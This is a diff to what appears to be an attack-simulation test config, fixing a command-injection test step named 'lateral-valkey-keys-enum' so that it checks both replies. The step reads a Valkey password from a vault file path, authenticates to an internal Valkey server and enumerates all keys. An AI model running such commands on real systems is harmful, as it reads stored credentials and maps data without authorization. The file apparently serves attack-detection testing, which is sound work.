@@ -1264,11 +1264,11 @@ attacks:
   - name: lateral-valkey-keys-enum
     type: cmdinject
     exec:
-      # Validate the AUTH reply explicitly: -WRONGPASS / -NOAUTH leaves
-      # python's exit code at 0, so the previous version false-passed on
-      # auth failure. Now we parse the RESP reply, raise on anything but
-      # +OK from AUTH, and only emit the sentinel on a clean handshake.
-      command: ["sh", "-c", "python3 -c \"import socket,sys; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'*2\\r\\n\\$4\\r\\nAUTH\\r\\n\\${len(pw)}\\r\\n{pw}\\r\\n'.encode()); reply=s.recv(64).decode(); sys.exit(0 if reply.startswith('+OK') else 1); s.sendall(b'*2\\r\\n\\$4\\r\\nKEYS\\r\\n\\$1\\r\\n*\\r\\n'); s.recv(2048)\" 2>/dev/null && echo valkey_enum_done"]
+      # Validate the AUTH reply AND the KEYS reply explicitly. -WRONGPASS /
+      # -NOAUTH on AUTH or any '-' (error) prefix on KEYS leaves python's
+      # exit code at 0 unless we check. We only exit 0 when both replies
+      # are clean (AUTH = '+OK', KEYS = '*<n>'-multi-bulk reply).
+      command: ["sh", "-c", "python3 -c \"import socket,sys; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'*2\\r\\n\\$4\\r\\nAUTH\\r\\n\\${len(pw)}\\r\\n{pw}\\r\\n'.encode());\nauth=s.recv(64).decode()\nif not auth.startswith('+OK'): sys.exit(1)\ns.sendall(b'*2\\r\\n\\$4\\r\\nKEYS\\r\\n\\$1\\r\\n*\\r\\n')\nkeys=s.recv(2048).decode()\nsys.exit(0 if keys.startswith('*') else 1)\" 2>/dev/null && echo valkey_enum_done"]
     successIndicators:
       - responseContains: "valkey_enum_done"
     expectedDetections: []
